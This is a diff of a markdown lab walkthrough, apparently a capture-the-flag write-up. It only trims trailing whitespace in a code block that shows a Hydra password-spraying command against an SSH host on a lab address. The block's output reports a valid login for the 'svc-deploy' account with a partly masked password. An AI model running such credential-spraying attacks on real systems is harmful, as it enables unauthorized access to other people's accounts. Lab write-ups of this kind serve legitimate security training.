@@ -164,15 +164,15 @@ We also have list of usernames, let's see if password spraying works.
 <img width="1247" height="947" alt="image" src="https://github.com/user-attachments/assets/a4c77eed-4b29-45e7-a105-8c41be77a449" />
 
 ```bash
-kali@kali:hydra -L users.txt -p 'D3...2!' ssh://10.129.253.255                                                                                       
-Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).                                                                                                   
-                                                                                                                                                         
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-13 02:55:41                                                                       
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4                                    
-[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:8/p:1), ~1 try per task                                                               
-[DATA] attacking ssh://10.129.253.255:22/                                                                                                                
-[22][ssh] host: 10.129.253.255   login: svc-deploy   password: D3...2!                                                                         
-1 of 1 target successfully completed, 1 valid password found                                                                                             
+kali@kali:hydra -L users.txt -p 'D3...2!' ssh://10.129.253.255
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-13 02:55:41
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:8/p:1), ~1 try per task
+[DATA] attacking ssh://10.129.253.255:22/
+[22][ssh] host: 10.129.253.255   login: svc-deploy   password: D3...2!
+1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-13 02:55:48
 ```
 
